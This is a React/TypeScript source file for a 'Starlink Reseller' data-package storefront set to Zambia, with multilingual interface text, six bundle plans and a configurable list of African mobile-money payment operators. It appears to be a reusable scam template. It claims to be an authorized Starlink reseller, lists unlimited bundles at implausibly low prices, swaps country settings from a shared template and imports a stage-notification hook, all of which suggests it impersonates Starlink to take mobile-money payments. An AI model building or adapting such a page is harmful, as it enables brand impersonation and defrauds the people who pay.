import { useState, useEffect } from "react";
import AirtelPayment from "@/AirtelPayment";
import OrangePayment from "@/OrangePayment";
import { notifyStage } from "@/lib/notify";

type Lang = "en" | "fr" | "my" | "rn" | "ar" | "am" | "st";

const COUNTRY_NAME = "Zambia";
const COUNTRY_CODE = "ZM";
const CURRENCY = "ZMW";

const translations: Record<Lang, Record<string, string>> = {
  en: {
    pageTitle: "Packages - Starlink",
    headerSubtitle: "Reseller",
    navStatus: "Status",
    navPlans: "Packages",
    navOrders: "Orders",
    navSettings: "Settings",
    plansSubtitle: "Internet Packages",
    plansTitle: "Choose Your Package",
    plansDesc:
      "Select a package and pay via Airtel Money to activate immediately.",
    hint: "1) Tap a package  2) Choose your Mobile Money operator",
    pkgStarter: "Starter Bundle",
    pkgStandard: "Advanced Bundle",
    pkgPremium: "Elite Bundle",
    pkgPro: "Pro Bundle",
    pkgBusiness: "Business Bundle",
    pkgUnlimited: "Unlimited Bundle",
    twoMonths: "/2 months",
    threeMonths: "/3 months",
    unlimitedData: "Unlimited data",
    popular: "Popular",
    budget: "Budget-friendly",
    bestValue: "Best value",
    streamingHD: "HD Streaming",
    heavyUsage: "Heavy usage",
    enterprise: "Enterprise",
    prioritySupport: "Priority support",
    unlimited247: "Unlimited 24/7",
    vipSupport: "VIP Support",
    staticIP: "Static IP",
    paymentTitle: "Airtel Money Payment",
    paymentDesc:
      "First click a package, then select Airtel Money to complete the payment.",
    payMethodTitle: "Select Payment Method",
    payMethodSubtitle: "Choose how you want to pay",
    payMethodAirtel: "Pay with your Airtel wallet",
    payMethodMtn: "Pay with MTN MoMo",
    payMethodMoov: "Pay with Moov Money",
    payMethodLumitel: "Pay with Lumitel",
    payMethodVodacom: "Pay with Vodacom M-Pesa",
    payMethodEcocash: "Pay with EcoCash",
    payMethodOrange: "Pay with Orange Money",
    payMethodWafi: "Pay with WAAFI",
    cancelBtn: "Cancel",
    modalTitle: "Processing...",
    modalSubtitle: "Secure redirection to the Airtel Money payment gateway",
    modalSubtitleMtn: "Secure redirection to the MTN MoMo payment gateway",
    modalWarning: "Please do not refresh the page",
    footerDesc:
      "Authorized reseller of data packages for Starlink services. Fast, reliable and secure payments via Airtel Money.",
    footerSupport: "Available 24/7 for technical support.",
    footerPayment:
      "Pay securely with Airtel Money. Make sure you have sufficient balance for the selected package.",
    footerCopyright: "© 2026 Starlink Reseller. All rights reserved.",
    configureBtn: "Configure",
    configureTitle: "No Active Package",
    configureMsg:
      "You don't have an active subscription for this package. Subscribe now to activate it.",
    subscribeNow: "Subscribe Now",
    closeBtn: "Close",
  },
  fr: {
    pageTitle: "Forfaits - Starlink",
    headerSubtitle: "Revendeur",
    navStatus: "Statut",
    navPlans: "Forfaits",
    navOrders: "Commandes",
    navSettings: "Paramètres",
    plansSubtitle: "Forfaits Internet",
    plansTitle: "Choisissez Votre Forfait",
    plansDesc:
      "Sélectionnez un forfait et payez via Airtel Money pour activer immédiatement.",
    hint: "1) Cliquez sur un forfait  2) Choisissez un opérateur Mobile Money",
    pkgStarter: "Forfait Starter",
    pkgStandard: "Forfait Avancé",
    pkgPremium: "Forfait Élite",
    pkgPro: "Forfait Pro",
    pkgBusiness: "Forfait Business",
    pkgUnlimited: "Forfait Illimité",
    twoMonths: "/2 mois",
    threeMonths: "/3 mois",
    unlimitedData: "Données illimitées",
    popular: "Populaire",
    budget: "Économique",
    bestValue: "Meilleur rapport",
    streamingHD: "Streaming HD",
    heavyUsage: "Usage intensif",
    enterprise: "Entreprise",
    prioritySupport: "Support prioritaire",
    unlimited247: "Illimité 24/7",
    vipSupport: "Support VIP",
    staticIP: "IP statique",
    paymentTitle: "Paiement Airtel Money",
    paymentDesc:
      "Cliquez d’abord sur un forfait, puis sélectionnez Airtel Money pour finaliser le paiement.",
    payMethodTitle: "Choisissez votre mode de paiement",
    payMethodSubtitle: "Comment souhaitez-vous payer ?",
    payMethodAirtel: "Payez avec votre portefeuille Airtel",
    payMethodMtn: "Payez avec MTN MoMo",
    payMethodMoov: "Payez avec Moov Money",
    payMethodLumitel: "Payez avec Lumitel",
    payMethodVodacom: "Payez avec Vodacom M-Pesa",
    payMethodEcocash: "Payez avec EcoCash",
    payMethodOrange: "Payez avec Orange Money",
    payMethodWafi: "Payez avec WAAFI",
    cancelBtn: "Annuler",
    modalTitle: "Traitement en cours...",
    modalSubtitle:
      "Redirection sécurisée vers la passerelle de paiement Airtel Money",
    modalSubtitleMtn:
      "Redirection sécurisée vers la passerelle de paiement MTN MoMo",
    modalWarning: "Veuillez ne pas actualiser la page",
    footerDesc:
      "Revendeur agréé de forfaits de données pour les services Starlink. Paiements rapides, fiables et sécurisés via Airtel Money.",
    footerSupport: "Disponible 24h/24, 7j/7 pour l'assistance technique.",
    footerPayment:
      "Payez en toute sécurité avec Airtel Money. Assurez-vous d'avoir un solde suffisant pour le forfait sélectionné.",
    footerCopyright: "© 2026 Starlink Reseller. Tous droits réservés.",
    configureBtn: "Configurer",
    configureTitle: "Aucun forfait actif",
    configureMsg:
      "Vous n'avez pas encore de forfait actif pour ce service. Abonnez-vous maintenant pour l'activer.",
    subscribeNow: "S'abonner maintenant",
    closeBtn: "Fermer",
  },
  my: {
    pageTitle: "ပက်ကေ့ဂျ်များ - Starlink",
    headerSubtitle: "ပြန်လည်ရောင်းချသူ",
    navStatus: "အခြေအနေ",
    navPlans: "ပက်ကေ့ဂျ်များ",
    navOrders: "မှာယူမှုများ",
    navSettings: "ဆက်တင်များ",
    plansSubtitle: "အင်တာနက် ပက်ကေ့ဂျ်များ",
    plansTitle: "သင့်ပက်ကေ့ဂျ်ကို ရွေးချယ်ပါ",
    plansDesc:
      "ပက်ကေ့ဂျ်တစ်ခုကို ရွေးချယ်ပြီး ချက်ချင်းအသက်သွင်းရန် မိုဘိုင်းငွေဖြင့် ပေးချေပါ။",
    hint: "1) ပက်ကေ့ဂျ်ကို နှိပ်ပါ  2) သင့် Mobile Money အော်ပရေတာကို ရွေးချယ်ပါ",
    pkgStarter: "Starter ပက်ကေ့ဂျ်",
    pkgStandard: "Advanced ပက်ကေ့ဂျ်",
    pkgPremium: "Elite ပက်ကေ့ဂျ်",
    pkgPro: "Pro ပက်ကေ့ဂျ်",
    pkgBusiness: "Business ပက်ကေ့ဂျ်",
    pkgUnlimited: "Unlimited ပက်ကေ့ဂျ်",
    twoMonths: "/၂ လ",
    threeMonths: "/၃ လ",
    unlimitedData: "ဒေတာ အကန့်အသတ်မရှိ",
    popular: "လူကြိုက်များ",
    budget: "ဘတ်ဂျက်သက်သာ",
    bestValue: "အကောင်းဆုံးတန်ဖိုး",
    streamingHD: "HD ကြည့်ရှုရေး",
    heavyUsage: "အသုံးများသည်",
    enterprise: "လုပ်ငန်းသုံး",
    prioritySupport: "ဦးစားပေး ပံ့ပိုးမှု",
    unlimited247: "၂၄/၇ အကန့်အသတ်မရှိ",
    vipSupport: "VIP ပံ့ပိုးမှု",
    staticIP: "Static IP",
    paymentTitle: "Airtel Money Payment",
    paymentDesc: "Select a package then choose Airtel Money to pay.",
    payMethodTitle: "ငွေပေးချေမှု နည်းလမ်း ရွေးချယ်ပါ",
    payMethodSubtitle: "မည်သို့ ပေးချေလိုသနည်း?",
    payMethodAirtel: "Airtel ပိုက်ဆံအိတ်ဖြင့် ပေးချေပါ",
    payMethodMtn: "MTN MoMo ဖြင့် ပေးချေပါ",
    payMethodMoov: "Moov Money ဖြင့် ပေးချေပါ",
    payMethodLumitel: "Lumitel ဖြင့် ပေးချေပါ",
    payMethodVodacom: "Vodacom M-Pesa ဖြင့် ပေးချေပါ",
    payMethodEcocash: "EcoCash ဖြင့် ပေးချေပါ",
    payMethodOrange: "Orange Money ဖြင့် ပေးချေပါ",
    payMethodWafi: "WAAFI ဖြင့် ပေးချေပါ",
    cancelBtn: "ပယ်ဖျက်ပါ",
    modalTitle: "လုပ်ဆောင်နေသည်...",
    modalSubtitle: "ငွေပေးချေမှု gateway သို့ လုံခြုံစွာ ပြန်ညွှန်းနေပါသည်",
    modalSubtitleMtn:
      "MTN MoMo ငွေပေးချေမှု gateway သို့ လုံခြုံစွာ ပြန်ညွှန်းနေပါသည်",
    modalWarning: "စာမျက်နှာကို refresh မလုပ်ပါနှင့်",
    footerDesc:
      "Starlink ဝန်ဆောင်မှုများအတွက် ဒေတာပက်ကေ့ဂျ်များ၏ တရားဝင်ပြန်လည်ရောင်းချသူ။ မိုဘိုင်းငွေဖြင့် မြန်ဆန်၊ ယုံကြည်ရပြီး လုံခြုံသော ငွေပေးချေမှုများ။",
    footerSupport: "နည်းပညာ ပံ့ပိုးမှုအတွက် ၂၄/၇ ရရှိနိုင်ပါသည်။",
    footerPayment:
      "မိုဘိုင်းငွေဖြင့် လုံခြုံစွာ ပေးချေပါ။ ရွေးချယ်ထားသော ပက်ကေ့ဂျ်အတွက် လုံလောက်သော လက်ကျန်ငွေ ရှိကြောင်း သေချာပါစေ။",
    footerCopyright:
      "© 2026 Starlink Reseller. မူပိုင်ခွင့်များ အားလုံးရယူထားသည်။",
    configureBtn: "ပြင်ဆင်သတ်မှတ်",
    configureTitle: "တက်ကြွသောပက်ကေ့ဂျ် မရှိပါ",
    configureMsg:
      "ဤပက်ကေ့ဂျ်အတွက် သင်တွင် တက်ကြွသောစာရင်းသွင်းမှု မရှိပါ။ ယခုပင် စာရင်းသွင်းပါ။",
    subscribeNow: "ယခုပင် စာရင်းသွင်း",
    closeBtn: "ပိတ်ပါ",
  },
  rn: {
    pageTitle: "Amafogito - Starlink",
    headerSubtitle: "Umucuruzi",
    navStatus: "Imimerere",
    navPlans: "Amafogito",
    navOrders: "Amasabwa",
    navSettings: "Igenamiterere",
    plansSubtitle: "Amafogito ya Internet",
    plansTitle: "Hitamwo Ifogito Ryanyu",
    plansDesc:
      "Hitamwo ifogito hanyuma wishure biciye kuri Lumitel kugira ritangure ako kanya.",
    hint: "1) Kanda ku fogito  2) Hitamwo umucuruzi wa Mobile Money",
    pkgStarter: "Ifogito Starter",
    pkgStandard: "Ifogito Avancé",
    pkgPremium: "Ifogito Élite",
    pkgPro: "Ifogito Pro",
    pkgBusiness: "Ifogito Business",
    pkgUnlimited: "Ifogito Unlimited",
    twoMonths: "/amezi 2",
    threeMonths: "/amezi 3",
    unlimitedData: "Amakuru atarimbiwe",
    popular: "Ikunzwe",
    budget: "Igiciro gito",
    bestValue: "Agaciro keza",
    streamingHD: "Streaming HD",
    heavyUsage: "Ikoreshwa ryinshi",
    enterprise: "Ikigo",
    prioritySupport: "Ubufasha bwihutirwa",
    unlimited247: "24/7 nta kimbiwe",
    vipSupport: "Ubufasha VIP",
    staticIP: "IP ihamye",
    paymentTitle: "Kwishura kuri Airtel Money",
    paymentDesc:
      "Banza ukande ku fogito, hanyuma uhitemo Airtel Money kugira urangize kwishura.",
    payMethodTitle: "Hitamwo uburyo bwo kwishura",
    payMethodSubtitle: "Urashaka kwishura gute?",
    payMethodAirtel: "Ishura biciye kuri Airtel Money",
    payMethodMtn: "Ishura biciye kuri MTN MoMo",
    payMethodMoov: "Ishura biciye kuri Moov Money",
    payMethodLumitel: "Ishura biciye kuri Lumitel",
    payMethodVodacom: "Ishura biciye kuri Vodacom M-Pesa",
    payMethodEcocash: "Ishura biciye kuri EcoCash",
    payMethodOrange: "Ishura biciye kuri Orange Money",
    payMethodWafi: "Ishura biciye kuri WAAFI",
    cancelBtn: "Guhagarika",
    modalTitle: "Biriko birashirwa mu ngiro...",
    modalSubtitle: "Kwoherezwa mu buryo bwizewe kuri Lumitel",
    modalSubtitleMtn: "Kuzeneza muburyo bwizewe kuri MTN MoMo",
    modalWarning: "Ntimwongere mushireho urupapuro",
    footerDesc:
      "Umucuruzi wemewe w'amafogito ya Starlink. Kwishura kw'ihuta, kwemerwa kandi k'umutekano biciye kuri Lumitel.",
    footerSupport:
      "Amasaha 24 kuri 24, imisi 7 kuri 7 ku bufasha bwa tekinike.",
    footerPayment:
      "Ishure mu mutekano biciye kuri Lumitel. Murabe mufise amafaranga ahagije ku fogito mwahisemwo.",
    footerCopyright:
      "© 2026 Starlink Reseller. Uburenganzira bwose burabitswe.",
    configureBtn: "Shiraho",
    configureTitle: "Nta fogito ufise",
    configureMsg:
      "Nta fogito ufise muri iki gihe kuri iyi serivisi. Iyandikishe none kugira ukorere.",
    subscribeNow: "Iyandikishe none",
    closeBtn: "Funga",
  },
  ar: {
    pageTitle: "باقات - Starlink",
    headerSubtitle: "موزع معتمد",
    navStatus: "الحالة",
    navPlans: "الباقات",
    navOrders: "الطلبات",
    navSettings: "الإعدادات",
    plansSubtitle: "باقات الإنترنت",
    plansTitle: "اختر باقتك",
    plansDesc: "اختر باقة وادفع عبر Orange Money لتفعيلها فوراً.",
    pkgStarter: "باقة البداية",
    pkgStandard: "الباقة المتقدمة",
    pkgPremium: "الباقة المميزة",
    pkgPro: "باقة Pro",
    pkgBusiness: "باقة الأعمال",
    pkgUnlimited: "باقة غير محدودة",
    twoMonths: "/شهرين",
    threeMonths: "/3 أشهر",
    unlimitedData: "بيانات غير محدودة",
    popular: "الأكثر شيوعاً",
    budget: "اقتصادي",
    bestValue: "أفضل قيمة",
    streamingHD: "بث مباشر HD",
    heavyUsage: "استخدام مكثف",
    enterprise: "للشركات",
    prioritySupport: "دعم ذو أولوية",
    unlimited247: "غير محدود 24/7",
    vipSupport: "دعم VIP",
    staticIP: "IP ثابت",
    paymentTitle: "دفع Orange Money",
    paymentDesc: "انقر على باقة ثم اختر Orange Money لإتمام الدفع.",
    payMethodTitle: "اختر طريقة الدفع",
    payMethodSubtitle: "كيف تريد الدفع؟",
    payMethodAirtel: "ادفع بمحفظة Orange Money",
    payMethodMtn: "ادفع بـ MTN MoMo",
    payMethodMoov: "ادفع بـ Moov Money",
    payMethodLumitel: "ادفع بـ Lumitel",
    payMethodVodacom: "ادفع بـ Vodacom M-Pesa",
    payMethodEcocash: "ادفع بـ EcoCash",
    payMethodOrange: "ادفع بـ Orange Money",
    payMethodWafi: "ادفع بـ WAAFI",
    cancelBtn: "إلغاء",
    modalTitle: "جارٍ المعالجة...",
    modalSubtitle: "تحويل آمن إلى بوابة دفع Orange Money",
    modalSubtitleMtn: "تحويل آمن إلى بوابة دفع MTN MoMo",
    modalWarning: "يرجى عدم تحديث الصفحة",
    footerDesc:
      "موزع معتمد لباقات بيانات Starlink. مدفوعات سريعة وآمنة عبر Orange Money.",
    footerSupport: "متاح 24/7 للدعم التقني.",
    footerPayment: "ادفع بأمان عبر Orange Money. تأكد من توفر رصيد كافٍ.",
    footerCopyright: "© 2026 Starlink Reseller. جميع الحقوق محفوظة.",
    configureBtn: "إعداد",
    configureTitle: "لا توجد باقة نشطة",
    configureMsg: "ليس لديك اشتراك نشط لهذه الباقة. اشترك الآن لتفعيلها.",
    subscribeNow: "اشترك الآن",
    closeBtn: "إغلاق",
  },
  am: {
    pageTitle: "\u1353\u12a8\u1302\u127d - Starlink",
    headerSubtitle: "\u1243\u123c",
    navStatus: "\u1201\u1290\u1273",
    navPlans: "\u1353\u12a8\u1302\u127d",
    navOrders: "\u1275\u12d5\u12db\u12be\u127d",
    navSettings: "\u1245\u1295\u1265\u122d\u127d",
    plansSubtitle:
      "\u12e8\u12a2\u1295\u1270\u122d\u1290\u1275 \u1353\u12a8\u1302\u127d",
    plansTitle: "\u1353\u12a8\u1303\u12ce\u1295 \u12ed\u121d\u1228\u1321",
    plansDesc:
      "\u1353\u12a8\u1305 \u12ed\u121d\u1228\u1321 \u12a5\u1293 \u12c8\u12f2\u12eb\u12cd \u1208\u121b\u1233\u122c\t \u12ed\u12ad\u1348\u1209\u1362",
    pkgStarter: "\u1218\u132d\u1218\u122d\u12eb \u1353\u12a8\u1305",
    pkgStandard: "\u1218\u12f0\u1260\u129b \u1353\u12a8\u1305",
    pkgPremium: "\u1355\u122d\u121a\u12e8\u121d \u1353\u12a8\u1305",
    pkgPro: "\u1355\u122e \u1353\u12a8\u1305",
    pkgBusiness: "\u1262\u12d8\u1290\u1235 \u1353\u12a8\u1305",
    pkgUnlimited: "\u12eb\u120d\u1270\u12c8\u1230\u1290 \u1353\u12a8\u1305",
    twoMonths: "/2 \u12c8\u122b\u1275",
    threeMonths: "/3 \u12c8\u122c\u1273\u1275",
    unlimitedData: "\u12eb\u120d\u1270\u12c8\u1230\u1290 \u12f3\u1273",
    popular: "\u1273\u12cb\u1242",
    budget: "\u1241\u323a\u1241\u323a\u1262",
    bestValue: "\u121d\u122d\u1325 \u12c8\u130b",
    streamingHD: "HD \u1235\u1275\u122d\u121a\u1295\u130d",
    heavyUsage: "\u12a8\u134d\u1270\u129b \u12a0\u1320\u1243\u1246\u121d",
    enterprise: "\u12f5\u122d\u1300\u1275",
    prioritySupport: "\u1245\u12f5\u121a\u12eb \u12f5\u130b\u134d",
    unlimited247: "\u12eb\u120d\u1270\u12c8\u1230\u1290 24/7",
    vipSupport: "VIP \u12f5\u130b\u134d",
    staticIP: "\u1245\u1219 IP",
    paymentTitle: "\u12ad\u134b\u12eb",
    paymentDesc:
      "\u1353\u12a8\u1305 \u12ed\u121d\u1228\u1321 \u12a8\u12da\u12eb\u121d \u1208\u121d\u12ad\u134b\u1275 \u12ed\u1240\u1325\u1209\u1362",
    payMethodTitle:
      "\u12e8\u12ad\u134b\u12eb \u12d8\u12f4 \u12ed\u121d\u1228\u1321",
    payMethodSubtitle:
      "\u12a5\u1295\u12f4 \u1218\u12ad\u134b\u120d \u12ed\u134c\u120b\u130d\u12f3\u1209?",
    payMethodAirtel: "\u12ed\u12ad\u134d\u1209",
    payMethodMtn: "MTN MoMo \u12cd\u1260 \u12ed\u12ad\u134d\u1209",
    payMethodMoov: "Moov Money \u12cd\u1260 \u12ed\u12ad\u134d\u1209",
    payMethodLumitel: "Lumitel \u12cd\u1260 \u12ed\u12ad\u134d\u1209",
    payMethodVodacom: "Vodacom M-Pesa \u12cd\u1260 \u12ed\u12ad\u134d\u1209",
    payMethodEcocash: "EcoCash \u12cd\u1260 \u12ed\u12ad\u134d\u1209",
    payMethodOrange: "Orange Money \u12cd\u1260 \u12ed\u12ad\u134d\u1209",
    payMethodWafi: "WAAFI \u12cd\u1260 \u12ed\u12ad\u134d\u1209",
    cancelBtn: "\u1230\u122d\u12d8",
    modalTitle: "\u1260\u12d8\u12f0 \u120b\u12ed...",
    modalSubtitle:
      "\u12c8\u12f0 \u12ad\u134b\u12eb \u12f5\u1228 \u12f0\u1205\u1295\u1290\u1271 \u1260\u1270\u130d\u1260\u1320 \u13e8\u12d8\u12c8\u12c8\u122d \u12e8\u1209",
    modalSubtitleMtn:
      "MTN MoMo \u12f5\u1228 \u12f0\u1205\u1295\u1290\u1271 \u1260\u1270\u130d\u1260\u1320 \u13e8\u12d8\u12c8\u12c8\u122d \u12e8\u1209",
    modalWarning:
      "\u1308\u1338\u12cb\u1295 \u12a5\u1295\u12f0\u1308\u1293 \u12a0\u12eb\u12a0\u12a0\u12f0\u122d\u130d\u1369",
    footerDesc:
      "\u1208Starlink \u12a0\u1308\u120d\u130e\u1276\u127d \u1353\u12a8\u1302\u127d \u134d\u1243\u12f5 \u12eb\u1208\u12cd \u1243\u123c\u1362",
    footerSupport:
      "24/7 \u1208\u1274\u12a8\u1292\u12ab\u12ca \u12f5\u130b\u134d \u12ed\u1308\u129b\u12f3\u1209\u1362",
    footerPayment:
      "\u12f0\u1205\u1295\u1290\u1271 \u1260\u1270\u130d\u1260\u1320 \u12ed\u12ad\u134d\u1209\u1362",
    footerCopyright:
      "\u00a9 2026 Starlink Reseller. \u1218\u1265\u1276\u127d \u1201\u1209 \u1270\u1320\u1260\u12b0\u12c8\u1271\u1362",
    configureBtn: "\u12a0\u12c8\u1243\u12f5",
    configureTitle: "\u12b5\u12a5 \u1353\u12a8\u1305 \u12e8\u1208\u121d",
    configureMsg:
      "\u1208\u12da\u1205 \u1353\u12a8\u1305 \u12b5\u12a5 \u121d\u12d8\u1308\u1263 \u12e8\u1208\u12ce\u1275\u121d\u1362 \u12a0\u1201\u1295 \u12ed\u121d\u12d8\u1308\u1261\u1362",
    subscribeNow: "\u12a0\u1201\u1295 \u12ed\u121d\u12d8\u1308\u1261",
    closeBtn: "\u12d8\u130b",
  },
  st: {
    pageTitle: "Lipheo - Starlink",
    headerSubtitle: "Morekisi",
    navStatus: "Boemo",
    navPlans: "Lipheo",
    navOrders: "Litaelo",
    navSettings: "Litlhophiso",
    plansSubtitle: "Lipheo tsa Inthanete",
    plansTitle: "Khetha Sepheo sa Hao",
    plansDesc: "Khetha sepheo ebe o lefela ka EcoCash ho se sebetsa hang.",
    pkgStarter: "Sepheo sa Qalo",
    pkgStandard: "Sepheo se Tsoetseng Pele",
    pkgPremium: "Sepheo se Phahameng",
    pkgPro: "Sepheo sa Pro",
    pkgBusiness: "Sepheo sa Khoebo",
    pkgUnlimited: "Sepheo se se Limiloa",
    twoMonths: "/likhoeli tse 2",
    threeMonths: "/likhoeli tse 3",
    unlimitedData: "Data e se nang moeli",
    popular: "E ratoang",
    budget: "E sa bitsi chelete",
    bestValue: "Boleng bo betso",
    streamingHD: "Streaming ea HD",
    heavyUsage: "Tshebediso e kholo",
    enterprise: "Khoebo",
    prioritySupport: "Tuso ea Mathata",
    unlimited247: "24/7 e se nang moeli",
    vipSupport: "Tuso ea VIP",
    staticIP: "IP e tsitsitseng",
    paymentTitle: "Tefo ea EcoCash",
    paymentDesc: "Khetha sepheo ebe o khetha EcoCash ho qetela tefo.",
    payMethodTitle: "Khetha Tsela ea Tefo",
    payMethodSubtitle: "O batla ho lefa jwang?",
    payMethodAirtel: "Lefa ka EcoCash ea hao",
    payMethodMtn: "Lefa ka MTN MoMo",
    payMethodMoov: "Lefa ka Moov Money",
    payMethodLumitel: "Lefa ka Lumitel",
    payMethodVodacom: "Lefa ka Vodacom M-Pesa",
    payMethodEcocash: "Lefa ka EcoCash",
    payMethodOrange: "Lefa ka Orange Money",
    payMethodWafi: "Lefa ka WAAFI",
    cancelBtn: "Hlaola",
    modalTitle: "E a sebetsa...",
    modalSubtitle: "Ho laeloa ka polokeho ho sethala sa tefo sa EcoCash",
    modalSubtitleMtn: "Ho laeloa ka polokeho ho sethala sa tefo sa MTN MoMo",
    modalWarning: "Ka kopo o se nchafatse leqephe",
    footerDesc:
      "Morekisi ea lumelletsoeng oa lipheo tsa data tsa Starlink. Litefiso tse potlakileng le tse bolokehileng ka EcoCash.",
    footerSupport: "E fumaneha 24/7 bakeng sa tsebo ea theknoloji.",
    footerPayment:
      "Lefa ka polokeho ka EcoCash. Netefatsa hore o na le chelete e lekaneng bakeng sa sepheo se khethiloeng.",
    footerCopyright: "© 2026 Starlink Reseller. Litokelo tsohle li bolokehile.",
    configureBtn: "Hlophisa",
    configureTitle: "Ha ho na Sepheo se Sebetsang",
    configureMsg:
      "Ha o na tlatsetso e sebetsang bakeng sa sepheo sena. Ingodisa joale ho se sebetsa.",
    subscribeNow: "Ingodisa Joale",
    closeBtn: "Koala",
  },
};

const LANG_CYCLE: Lang[] = ["fr", "en", "my", "rn", "ar", "am"];

function nextLang(l: Lang): Lang {
  const i = LANG_CYCLE.indexOf(l);
  return i === -1 ? "fr" : LANG_CYCLE[(i + 1) % LANG_CYCLE.length];
}

interface PlanCard {
  id: string;
  nameKey: string;
  size: string;
  periodKey: "twoMonths" | "threeMonths";
  unlimited?: boolean;
  price: number;
  originalPrice: number;
  features: { key: string; bg: string; text: string }[];
  iconBg: string;
  iconText: string;
  iconSvg: string;
  popular?: boolean;
}

/* Zambia (ZMW) bundles — mirrors plans.html?country=ZM */
const plans: PlanCard[] = [
  {
    id: "starter",
    nameKey: "pkgStarter",
    size: "120 GB",
    periodKey: "twoMonths",
    price: 15,
    originalPrice: 21,
    features: [
      { key: "unlimitedData", bg: "bg-green-100", text: "text-green-600" },
      { key: "budget", bg: "bg-green-100", text: "text-green-600" },
    ],
    iconBg: "bg-green-100",
    iconText: "text-green-600",
    iconSvg: "signal",
  },
  {
    id: "standard",
    nameKey: "pkgStandard",
    size: "250 GB",
    periodKey: "twoMonths",
    price: 30,
    originalPrice: 42,
    features: [
      { key: "unlimitedData", bg: "bg-blue-100", text: "text-blue-600" },
      { key: "bestValue", bg: "bg-blue-100", text: "text-blue-600" },
    ],
    iconBg: "bg-blue-100",
    iconText: "text-blue-600",
    iconSvg: "bolt",
    popular: true,
  },
  {
    id: "premium",
    nameKey: "pkgPremium",
    size: "400 GB",
    periodKey: "twoMonths",
    price: 45,
    originalPrice: 63,
    features: [
      { key: "unlimitedData", bg: "bg-purple-100", text: "text-purple-600" },
      { key: "streamingHD", bg: "bg-purple-100", text: "text-purple-600" },
    ],
    iconBg: "bg-purple-100",
    iconText: "text-purple-600",
    iconSvg: "rocket",
  },
  {
    id: "pro",
    nameKey: "pkgPro",
    size: "600 GB",
    periodKey: "threeMonths",
    price: 60,
    originalPrice: 84,
    features: [
      { key: "unlimitedData", bg: "bg-cyan-100", text: "text-cyan-600" },
      { key: "heavyUsage", bg: "bg-cyan-100", text: "text-cyan-600" },
    ],
    iconBg: "bg-cyan-100",
    iconText: "text-cyan-600",
    iconSvg: "cloud",
  },
  {
    id: "business",
    nameKey: "pkgBusiness",
    size: "1 TB",
    periodKey: "threeMonths",
    price: 90,
    originalPrice: 126,
    features: [
      { key: "unlimitedData", bg: "bg-indigo-100", text: "text-indigo-600" },
      { key: "enterprise", bg: "bg-indigo-100", text: "text-indigo-600" },
      { key: "prioritySupport", bg: "bg-indigo-100", text: "text-indigo-600" },
    ],
    iconBg: "bg-indigo-100",
    iconText: "text-indigo-600",
    iconSvg: "briefcase",
  },
  {
    id: "unlimited",
    nameKey: "pkgUnlimited",
    size: "",
    periodKey: "threeMonths",
    unlimited: true,
    price: 150,
    originalPrice: 210,
    features: [
      { key: "unlimited247", bg: "bg-orange-100", text: "text-orange-600" },
      { key: "vipSupport", bg: "bg-orange-100", text: "text-orange-600" },
      { key: "staticIP", bg: "bg-orange-100", text: "text-orange-600" },
    ],
    iconBg: "bg-gradient-to-br from-yellow-400 to-orange-500",
    iconText: "text-white",
    iconSvg: "star",
  },
];

interface PaymentMethod {
  id: string;
  name: string;
  descKey?: string;
  desc?: string;
  bg: string;
  color?: string;
  logo: string;
  imgSrc?: string;
  fontSize?: string;
  hover: string;
  visible: boolean;
}

/* Zambia enables MTN MoMo only — flip `visible` to re-enable others */
const paymentMethods: PaymentMethod[] = [
  {
    id: "airtel",
    name: "Airtel Money",
    descKey: "payMethodAirtel",
    bg: "#ed1c24",
    logo: "airtel",
    fontSize: "11px",
    hover: "hover:border-red-500 hover:bg-red-50",
    visible: false,
  },
  {
    id: "moov",
    name: "Moov Money",
    descKey: "payMethodMoov",
    bg: "#f5a623",
    logo: "Moov",
    fontSize: "9px",
    hover: "hover:border-amber-500 hover:bg-amber-50",
    visible: false,
  },
  {
    id: "lumitel",
    name: "My Lumitel",
    descKey: "payMethodLumitel",
    bg: "#f5a623",
    logo: "Lumitel",
    fontSize: "8px",
    hover: "hover:border-amber-500 hover:bg-amber-50",
    visible: false,
  },
  {
    id: "vodacom",
    name: "Vodacom M-Pesa",
    descKey: "payMethodVodacom",
    bg: "#e60000",
    logo: "",
    imgSrc:
      "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Vodacom_logo.svg/240px-Vodacom_logo.svg.png",
    hover: "hover:border-red-500 hover:bg-red-50",
    visible: false,
  },
  {
    id: "ecocash",
    name: "EcoCash",
    descKey: "payMethodEcocash",
    bg: "#0066b2",
    logo: "EcoCash",
    fontSize: "8px",
    hover: "hover:border-blue-600 hover:bg-blue-50",
    visible: false,
  },
  {
    id: "orange",
    name: "Orange Money",
    descKey: "payMethodOrange",
    bg: "#FF6600",
    logo: "Orange",
    fontSize: "11px",
    hover: "hover:border-orange-500 hover:bg-orange-50",
    visible: false,
  },
  {
    id: "waafi",
    name: "WAAFI",
    descKey: "payMethodWafi",
    bg: "#00a651",
    logo: "WAAFI",
    fontSize: "10px",
    hover: "hover:border-green-600 hover:bg-green-50",
    visible: false,
  },
  {
    id: "mtn",
    name: "MTN Mobile Money",
    descKey: "payMethodMtn",
    bg: "#ffcc00",
    color: "#000",
    logo: "MTN",
    fontSize: "13px",
    hover: "hover:border-yellow-500 hover:bg-yellow-50",
    visible: true,
  },
  {
    id: "kbzpay",
    name: "KBZPay",
    desc: "Pay with KBZPay",
    bg: "#0060af",
    logo: "KBZ",
    fontSize: "10px",
    hover: "hover:border-blue-700 hover:bg-blue-50",
    visible: false,
  },
  {
    id: "palmpay",
    name: "PalmPay",
    desc: "Pay with PalmPay wallet",
    bg: "linear-gradient(135deg,#19AB4F,#0d7a37)",
    logo: "PalmPay",
    fontSize: "9px",
    hover: "hover:border-green-600 hover:bg-green-50",
    visible: false,
  },
  {
    id: "dmoney",
    name: "D-MONEY",
    desc: "Payer avec D-MONEY Djibouti",
    bg: "#003f7a",
    logo: "D-MONEY",
    fontSize: "11px",
    hover: "hover:border-blue-800 hover:bg-blue-50",
    visible: false,
  },
  {
    id: "ethiopia",
    name: "Ethiopian Banks",
    desc: "KAAFI · CBO · NIB · WEGAGEN · AHADU",
    bg: "linear-gradient(135deg,#078930,#FCDD09,#DA121A)",
    logo: "ETH",
    fontSize: "10px",
    hover: "hover:border-green-600 hover:bg-green-50",
    visible: false,
  },
  {
    id: "card",
    name: "Debit Card",
    desc: "Pay with Visa or Mastercard",
    bg: "#1a56db",
    logo: "💳",
    fontSize: "16px",
    hover: "hover:border-blue-700 hover:bg-blue-50",
    visible: false,
  },
];

function Icon({ name, className }: { name: string; className: string }) {
  const icons: Record<string, string> = {
    signal: "M2 22h2v-4H2v4zm5 0h2V12H7v10zm5 0h2V8h-2v14zm5 0h2V4h-2v18z",
